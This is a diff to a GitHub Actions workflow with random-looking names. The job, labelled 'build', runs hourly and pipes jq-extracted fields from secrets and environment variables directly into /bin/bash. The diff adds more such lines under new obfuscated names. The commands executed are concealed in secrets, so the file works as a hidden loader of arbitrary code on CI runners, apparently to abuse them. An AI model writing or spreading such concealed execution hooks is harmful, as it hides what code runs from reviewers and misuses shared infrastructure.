@@ -3,21 +3,21 @@ name: weishizhong3674
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 * * * *'
-
-jobs:  # 10891
+    - cron: '16 * * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weishizhong3674
         env:
-          ris390: ${{ secrets.ris390 }}
+          dq088: ${{ secrets.dq088 }}
         run: |
-          echo $ris390 | jq -r .mizpd80921 | /bin/bash
-          echo $xjib529 | jq -r .huk5 | /bin/bash
-          echo $kpnm9307 | jq -r .xkqg3 | /bin/bash
-          echo $iolv044 | jq -r .jwvvx28 | /bin/bash
-          echo $zxkgp458 | jq -r .mm99667 | /bin/bash
+          echo $dq088 | jq -r .tsnn3 | /bin/bash
+          echo $y83 | jq -r .xxbok7643 | /bin/bash
+          echo $ufvu445 | jq -r .zjjs76 | /bin/bash
+          echo $jrfhn05 | jq -r .sary82 | /bin/bash
+          echo $jsucc35873 | jq -r .b88 | /bin/bash
+          echo $vosmi8 | jq -r .xn6 | /bin/bash
+          echo $g60876 | jq -r .xlp1 | /bin/bash
 
